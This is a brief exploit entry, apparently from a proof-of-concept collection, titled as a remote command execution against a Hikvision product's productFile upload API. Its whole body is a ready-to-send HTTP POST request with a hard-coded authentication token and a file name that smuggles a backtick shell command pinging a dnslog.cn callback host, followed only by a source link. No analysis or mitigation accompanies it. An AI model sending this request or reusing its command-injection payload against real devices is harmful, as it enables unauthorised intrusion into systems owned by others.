# hikvision_productFile_rce

```
POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1
Host: 
Token: SElLIElnVTBzNVd6eWlibVB4M046dUE0SlBBbGJTWGNMUnk5aWg4dkJXL2RjeEdqKys4aTd0cHBMM09INytVZz0=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
Content-Length: 346

-----------------------------142851345723692939351758052805
Content-Disposition: form-data; name="file"; filename="`ping xxx.dnslog.cn`.zip"
Content-Type: application/zip

123
-----------------------------142851345723692939351758052805--
```

from: https://mp.weixin.qq.com/s/8mrt1KLLBQbhVorI4TwWvg
